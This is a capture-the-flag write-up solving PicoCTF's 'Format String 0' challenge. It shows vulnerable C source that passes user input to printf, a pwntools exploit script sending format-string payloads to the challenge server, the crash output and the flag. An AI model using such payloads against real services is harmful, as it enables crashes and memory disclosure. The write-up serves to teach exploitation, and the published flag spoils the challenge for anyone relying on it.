# format string 0

***

## Writeup: Format String 0 - PicoCTF

### Challenge Overview

* **Name:** Format String 0
* **Author:** Cheng Zhang
* **Category:** Binary Exploitation
* **Points:** (Assuming 100-200, typical PicoCTF intro)
* **Server:** `nc mimas.picoctf.net 65535`
* **Files:** `format0.c` (source), `format0` (binary)
* **Description:** "Can you use your knowledge of format strings to make the customers happy?"
* **Hints:**
  * "This is an introduction of format string vulnerabilities. Look up 'format specifiers' if you have never seen them before."
  * "Just try out the different options."

This PicoCTF challenge serves up a tasty format string vuln on a remote instance. Our mission: satisfy Patrick and crash Bob to snag the flag via a SEGFAULT.

***

### Initial Analysis

#### Binary Protections

(Assumed from source and PicoCTF norms):

* **Arch:** amd64-64-little
* **RELRO:** Likely Partial RELRO
* **Stack:** No canary (format string focus)
* **NX:** Enabled
* **PIE:** Likely disabled
* **Stripped:** Likely not stripped

#### Source Code

```c
#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

void serve_patrick() {
    printf("Enter your recommendation: ");
    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n", "Patrick is still hungry!", "Try to serve him something of larger size!");
        }
    }
}

void serve_bob() {
    printf("Enter your recommendation: ");
    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

* **Vuln:** `printf(choice1)` and `printf(choice2)` use user input as format strings.
* **Patrick:** Needs output > 64 chars (`2 * BUFSIZE`) to reach Bob.
* **Bob:** Needs a SEGFAULT to trigger `sigsegv_handler()` and print the flag.

***

### Exploitation Plan

#### Step 1: Format String 101

* **Bug:** `printf(user_input)` treats input as a format string.
* **Specifiers:**
  * `%d`: Prints an integer from the stack.
  * `%s`: Dereferences a pointer from the stack.
* **Exploit:** Use specifiers to manipulate output or crash.

#### Step 2: Serve Patrick

* **Menu:** `Breakf@st_Burger`, `Gr%114d_Cheese`, `Bac0n_D3luxe`.
* **Goal:** `printf(choice1) > 64`.
* **Choice:** `Gr%114d_Cheese`—`%114d` prints a wide integer (e.g., 114 spaces + digits).

#### Step 3: Serve Bob

* **Menu:** `Pe%to_Portobello`, `$outhwest_Burger`, `Cla%sic_Che%s%steak`.
* **Goal:** SEGFAULT with `printf(choice2)`.
* **Choice:** `Cla%sic_Che%s%steak`—multiple `%s` specifiers dereference junk stack values.

***

### Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Connect
p = remote('mimas.picoctf.net', 65535)

# Serve Patrick
p.recvuntil(b'Enter your recommendation: ')
p.sendline(b'Gr%114d_Cheese')
log.info('Sent to Patrick: Gr%114d_Cheese')
p.recvuntil(b'Good job! Patrick is happy!')

# Serve Bob
p.recvuntil(b'Enter your recommendation: ')
p.sendline(b'Cla%sic_Che%s%steak')
log.info('Sent to Bob: Cla%sic_Che%s%steak')

# Get flag
p.interactive()
```

#### How It Works

1. **Patrick:**
   * Sends `Gr%114d_Cheese`.
   * `printf("Gr%114d_Cheese")` outputs "Gr" + wide integer + "\_Cheese" (>64 chars).
   * Advances to Bob.
2. **Bob:**
   * Sends `Cla%sic_Che%s%steak`.
   * `printf("Cla%sic_Che%s%steak")` tries to dereference 3 stack values as pointers, crashes.
   * `sigsegv_handler()` prints the flag.

***

### Execution

From your run:

```
$ python exp.py
[+] Opening connection to mimas.picoctf.net:65535: Done
[*] Sent to Patrick: Gr%114d_Cheese
[*] Sent to Bob: Cla%sic_Che%s%steak
[*] Switching to interactive mode
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
[*] Got EOF while reading in interactive
```

* **Patrick:** Long output satisfied `count > 64`.
* **Bob:** Crashed on `%s`, flag appeared.

***

### Challenges Faced

1. **Patrick’s Appetite:** Needed a big output—`%114d` did the trick.
2. **Bob’s Crash:** `Cla%sic_Che%s%steak` reliably SEGFAULTed with multiple `%s`.
3. **Remote Only:** Tested options live, guided by the hint.

***

### Conclusion

"Format String 0" was a delicious intro to format string exploits. We stuffed Patrick with a `%114d` burger to move on, then crashed Bob’s order with `%s` chaos, triggering a SEGFAULT for the flag. No buffers harmed—just pure format string fun!

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}`

Happy hacking!

***
